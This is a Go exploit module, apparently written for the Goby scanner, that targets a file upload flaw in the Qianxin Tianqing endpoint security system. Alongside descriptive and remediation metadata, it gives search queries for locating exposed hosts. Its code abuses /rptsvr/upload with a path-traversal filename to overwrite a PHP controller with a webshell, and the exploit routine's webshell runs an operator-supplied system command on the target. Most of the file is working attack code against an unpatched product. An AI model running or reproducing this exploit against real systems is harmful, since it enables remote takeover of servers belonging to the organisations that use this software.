package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Tianqing file upload",
    "Description": "<p>Tianqing terminal security management system is a solution integrating antivirus and terminal security management for government, enterprises, finance, military, medical, education, manufacturing and other large enterprises and institutions.</p><p>File upload vulnerability exists due to no file name check in reportsteward.exe of Tianqing terminal security management system. Attackers can upload files through the /rptsvr/upload, using ../ and so on through the directory upload any path, and then upload the php file, the attacker can directly upload malicious code to the server, the server is controlled by remote.</p>",
    "Product": "Qianxin-TianQing",
    "Homepage": "https://www.qianxin.com/",
    "DisclosureDate": "2023-1-3",
    "Author": "liuzhenqi@baimaohui.net",
    "FofaQuery": "body=\"https://www.qianxin.com/product/terminal_security_mgt\" || body=\"skylarinst(%s).exe\" || title=\"360新天擎\" || title=\"360天擎终端安全管理系统\"",
    "GobyQuery": "body=\"https://www.qianxin.com/product/terminal_security_mgt\" || body=\"skylarinst(%s).exe\" || title=\"360新天擎\" || title=\"360天擎终端安全管理系统\"",
    "Level": "3",
    "Impact": "<p>Tianqing terminal security management system is a solution integrating antivirus and terminal security management for government, enterprises, finance, military, medical, education, manufacturing and other large enterprises and institutions.</p><p>File upload vulnerability exists due to no file name check in reportsteward.exe of Tianqing terminal security management system. Attackers can upload files through the /rptsvr/upload, using ../ and so on through the directory upload any path, and then upload the php file, the attacker can directly upload malicious code to the server, the server is controlled by remote.</p>",
    "Recommendation": "<p>1.The official government has not fixed the vulnerability. Users are advised to contact the manufacturer to repair the vulnerability or follow the manufacturer's homepage at any time for a solution:<a href=\"https://www.qianxin.com/\">https://www.qianxin.com/</a></p><p>2. Disable the execution permission for the directory where files are uploaded.</p><p>3. The suffix of uploaded files should be whitelist and other restrictions.</p><p>4. The saving path should be restricted and verified.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.7",
    "Translation": {
        "CN": {
            "Name": "天擎前台文件上传漏洞",
            "Product": "奇安信-天擎",
            "Description": "<p>天擎终端安全管系统是面向政府、企业、金融、军队、医疗、教育、制造业等大型企事业单位推出的集防病毒与终端安全管控于一体的解决方案。</p><p>天擎终端安全管系统中reportsteward.exe没有对文件名进行检测导致文件上传，攻击者可通过接口/rptsvr/upload，先利用../等进行目录穿越上传任意路径，然后上传php文件，攻击者可直接上传恶意代码到服务器上，服务器被远程控制。</p>",
            "Recommendation": "<p>1、官方未修复该漏洞，建议用户联系厂商修复漏洞或随时关注厂商主页以获取解决办法：<a href=\"https://www.qianxin.com/\" target=\"_blank\">https://www.qianxin.com/</a></p><p>2、文件上传的存储目录禁用执行权限。</p><p>3、上传文件的后缀应该加白名单等限制。</p><p>4、保存路径应作限制和校验。</p>",
            "Impact": "<p>天擎终端安全管系统是面向政府、企业、金融、军队、医疗、教育、制造业等大型企事业单位推出的集防病毒与终端安全管控于一体的解决方案。</p><p>天擎终端安全管系统中reportsteward.exe没有对文件名进行检测导致文件上传，攻击者可通过接口/rptsvr/upload，先利用../等进行目录穿越上传任意路径，然后上传php文件，攻击者可直接上传恶意代码到服务器上，服务器被远程控制。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Tianqing file upload",
            "Product": "Qianxin-TianQing",
            "Description": "<p>Tianqing terminal security management system is a solution integrating antivirus and terminal security management for government, enterprises, finance, military, medical, education, manufacturing and other large enterprises and institutions.</p><p>File upload vulnerability exists due to no file name check in reportsteward.exe of Tianqing terminal security management system. Attackers can upload files through the /rptsvr/upload, using ../ and so on through the directory upload any path, and then upload the php file, the attacker can directly upload malicious code to the server, the server is controlled by remote.</p>",
            "Recommendation": "<p>1.The official government has not fixed the vulnerability. Users are advised to contact the manufacturer to repair the vulnerability or follow the manufacturer's homepage at any time for a solution:<a href=\"https://www.qianxin.com/\" target=\"_blank\">https://www.qianxin.com/</a></p><p>2. Disable the execution permission for the directory where files are uploaded.</p><p>3. The suffix of uploaded files should be whitelist and other restrictions.</p><p>4. The saving path should be restricted and verified.</p>",
            "Impact": "<p>Tianqing terminal security management system is a solution integrating antivirus and terminal security management for government, enterprises, finance, military, medical, education, manufacturing and other large enterprises and institutions.</p><p>File upload vulnerability exists due to no file name check in reportsteward.exe of Tianqing terminal security management system. Attackers can upload files through the /rptsvr/upload, using ../ and so on through the directory upload any path, and then upload the php file, the attacker can directly upload malicious code to the server, the server is controlled by remote.</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10968"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			var exploit_0176 = func(u *httpclient.FixUrl, webshell string) {
				cfg := httpclient.NewPostRequestConfig("/rptsvr/upload")
				cfg.Header.Store("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36")
				cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
				cfg.Header.Store("Accept-Language", "zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6")
				cfg.Header.Store("Accept-Encoding", "gzip, deflate")
				cfg.Header.Store("Content-Type", "multipart/form-data; boundary=---------------------------55433477442814818502792421460")
				//Cookie: SKYLARa7e3918c30fdaa641ea1fc2f0c=iouj4m7as0bi041r7eeip52tv0; YII_CSRF_TOKEN=451a827a59b5e2917bf1e1681ac7ba7d1351d346s%3A40%3A%22ec274984d6d6008386d91140b21666bc52ad1d0f%22%3B
				cfg.Header.Store("Upgrade-Insecure-Requests", "1")

				cfg.VerifyTls = false
				cfg.FollowRedirect = false
				cfg.Data = "-----------------------------55433477442814818502792421460\nContent-Disposition: form-data; name=\"uploadfile\"; filename=\"../../../application/api/controllers/SController.php\"\nContent-Type: text/x-python\n\n" + webshell + "\n-----------------------------55433477442814818502792421460\nContent-Disposition: form-data; name=\"token\"\n\nskylar_report\n-----------------------------55433477442814818502792421460--\n"
				httpclient.DoHttpRequest(u, cfg)
			}

			checkStr := goutils.RandomHexString(4)
			webshell := "<?php\nclass SController extends BaseApiController\n{\n    protected function beforeAction($action)\n    {\n        return true;\n    }\n// https://ip/api/S/S\n\tpublic function action" + checkStr + "()\n\t{\n       phpinfo();\n\t}\n}\n?>"
			exploit_0176(u, webshell)
			cfg2 := httpclient.NewGetRequestConfig("/api/S/" + checkStr)
			if resp, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "PHP Version") {
					return true
				}
			}
			return false

		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var exploit_0176 = func(u *httpclient.FixUrl, webshell string) {
				cfg := httpclient.NewPostRequestConfig("/rptsvr/upload")
				cfg.Header.Store("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36")
				cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
				cfg.Header.Store("Accept-Language", "zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6")
				cfg.Header.Store("Accept-Encoding", "gzip, deflate")
				cfg.Header.Store("Content-Type", "multipart/form-data; boundary=---------------------------55433477442814818502792421460")
				//Cookie: SKYLARa7e3918c30fdaa641ea1fc2f0c=iouj4m7as0bi041r7eeip52tv0; YII_CSRF_TOKEN=451a827a59b5e2917bf1e1681ac7ba7d1351d346s%3A40%3A%22ec274984d6d6008386d91140b21666bc52ad1d0f%22%3B
				cfg.Header.Store("Upgrade-Insecure-Requests", "1")

				cfg.VerifyTls = false
				cfg.FollowRedirect = false
				cfg.Data = "-----------------------------55433477442814818502792421460\nContent-Disposition: form-data; name=\"uploadfile\"; filename=\"../../../application/api/controllers/SController.php\"\nContent-Type: text/x-python\n\n" + webshell + "\n-----------------------------55433477442814818502792421460\nContent-Disposition: form-data; name=\"token\"\n\nskylar_report\n-----------------------------55433477442814818502792421460--\n"
				httpclient.DoHttpRequest(u, cfg)
			}

			cmd := ss.Params["cmd"].(string)

			checkStr := goutils.RandomHexString(4)
			webshell := "<?php\nclass SController extends BaseApiController\n{\n    protected function beforeAction($action)\n    {\n        return true;\n    }\n// https://ip/api/S/S\n\tpublic function action" + checkStr + "()\n\t{\n       echo system(\"" + cmd + "\");\n\t}\n}\n?>"

			exploit_0176(expResult.HostInfo, webshell)

			// eval($_POST[depy]);
			cfg2 := httpclient.NewGetRequestConfig("/api/S/" + checkStr)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
				expResult.Output = resp.Utf8Html
				expResult.Success = true
			}
			return expResult
		},
	))
}
